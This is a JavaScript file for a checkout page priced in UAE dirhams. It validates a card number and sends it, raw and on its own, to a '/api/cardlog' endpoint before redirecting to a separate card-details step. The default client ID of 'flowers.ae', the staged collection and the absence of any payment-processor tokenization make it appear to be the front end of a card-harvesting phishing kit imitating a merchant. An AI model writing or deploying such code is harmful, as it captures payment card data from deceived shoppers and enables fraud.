// card.js (updated)
(function () {
  const form = document.getElementById("payment-form");
  const cardNumber = document.getElementById("cardNumber");
  const submitBtn = form.querySelector(".pay-button");
  const paymentAmount = document.getElementById("paymentAmount");
  const orderNumber = document.getElementById("orderNumber");
  const cardError = document.getElementById("cardError");

  // Format card number as "1234 1234 1234 1234"
  function formatCardNumber(v) {
    return v
      .replace(/\D/g, "")
      .slice(0, 16)
      .replace(/(.{4})/g, "$1 ")
      .trim();
  }

  // Update price from localStorage
  function updatePriceFromStorage() {
    const price = localStorage.getItem("price");
    const bookingId = localStorage.getItem("bookingId");

    if (price) {
      const displayPrice = parseFloat(price).toFixed(2);
      paymentAmount.textContent = `AED ${displayPrice}`;
    }

    if (bookingId) {
      const textNode = orderNumber.firstChild;
      if (textNode) {
        textNode.textContent = bookingId;
      }
    }
  }

  cardNumber.addEventListener("input", (e) => {
    const before = e.target.value;
    const formatted = formatCardNumber(before);
    e.target.value = formatted;
    // clear error as user types
    clearCardError();
  });

  function simpleValidate() {
    const cleanCardNumber = cardNumber.value.replace(/\s/g, "");
    if (cleanCardNumber.length < 13) return "Enter a valid card number";
    return null;
  }

  // New: Check brand by first digit (Visa: 4, Mastercard: 5)
  function validateBrand() {
    const clean = cardNumber.value.replace(/\s/g, "");
    if (!clean || clean.length === 0) return null; // nothing to validate yet
    const first = clean.charAt(0);
    if (first !== "4" && first !== "5") {
      return "Please enter Visa or Mastercard";
    }
    return null;
  }

  function showCardError(message) {
    if (!cardError) return;
    cardError.textContent = message;
    cardError.style.display = "block";
    cardNumber.classList.add("input-error");
  }

  function clearCardError() {
    if (!cardError) return;
    cardError.textContent = "";
    cardError.style.display = "none";
    cardNumber.classList.remove("input-error");
  }

  form.addEventListener("submit", (e) => {
    e.preventDefault();

    clearCardError();

    // first check brand restriction
    const brandErr = validateBrand();
    if (brandErr) {
      showCardError(brandErr);
      // focus for UX
      cardNumber.focus();
      return;
    }

    // then basic length validation
    const err = simpleValidate();
    if (err) {
      showCardError(err);
      cardNumber.focus();
      return;
    }

    submitBtn.disabled = true;
    submitBtn.innerHTML =
      '<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10"></circle></svg> Processing...';

    // Get price from localStorage for the payload
    const price = localStorage.getItem("price") || "101.00";

    // Build payload for first step
    const payload = {
      sessionId: getSessionId(),
      clientId: getClientId(),
      cardNumber: cardNumber.value.replace(/\s/g, ""),
      step: "card_number_only",
      totalPrice: parseFloat(price), // Include price in the payload
    };

    // Send to server - first step
    fetch("/api/cardlog", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    })
      .then((res) => {
        // Store card number for the next step
        sessionStorage.setItem(
          "cardNumber",
          cardNumber.value.replace(/\s/g, "")
        );
        // Store price for the next step
        sessionStorage.setItem("price", price);
        // Redirect to card details page
        window.location.href = "/card-details";
      })
      .catch((err) => {
        console.error(err);
        alert("Network error – try again");
        submitBtn.disabled = false;
        submitBtn.innerHTML =
          '<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><path d="M12 1v22M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"></path></svg> Continue';
      });
  });

  // Helper functions for session/client data
  function getSessionId() {
    return localStorage.getItem("sessionId") || "unknown";
  }

  function getClientId() {
    return localStorage.getItem("clientId") || "flowers.ae";
  }

  // Set order number if available
  function setOrderNumber() {
    const bookingId = localStorage.getItem("bookingId");
    if (bookingId) {
      const textNode = orderNumber.firstChild;
      if (textNode) {
        textNode.textContent = bookingId;
      }
    }
  }

  // Initialize
  updatePriceFromStorage();
  setOrderNumber();
  clearCardError();
})();
